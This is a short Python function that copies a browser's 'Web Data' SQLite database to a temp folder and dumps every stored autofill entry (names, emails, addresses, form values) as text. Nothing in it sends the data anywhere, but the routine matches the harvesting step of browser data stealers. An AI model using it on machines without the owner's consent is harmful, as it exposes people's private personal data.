import os
import sqlite3
import shutil
import tempfile

def fetch_autofill_data(browser_path):
    """
    Connects to the browser's 'Web Data' SQLite database to retrieve and return autofill information.
    This includes stored names, emails, addresses, and other form data.

    Returns:
        str: Formatted autofill data.
    """
    web_data_path = os.path.join(browser_path, "Default", "Web Data")
    if not os.path.exists(web_data_path):
        return "No autofill data file found."

    # Create a temporary copy of the database
    temp_dir = tempfile.gettempdir()
    temp_web_data_path = os.path.join(temp_dir, "Web_Data_copy")
    shutil.copy2(web_data_path, temp_web_data_path)

    conn = sqlite3.connect(temp_web_data_path)
    cursor = conn.cursor()

    # Fetch autofill entries
    cursor.execute("SELECT name, value FROM autofill")
    data = "Autofill Data:\n"
    for row in cursor.fetchall():
        name, value = row
        data += f"Name: {name}, Value: {value}\n"
        data += "-" * 40 + "\n"

    conn.close()
    os.remove(temp_web_data_path)  # Clean up the temporary file
    return data
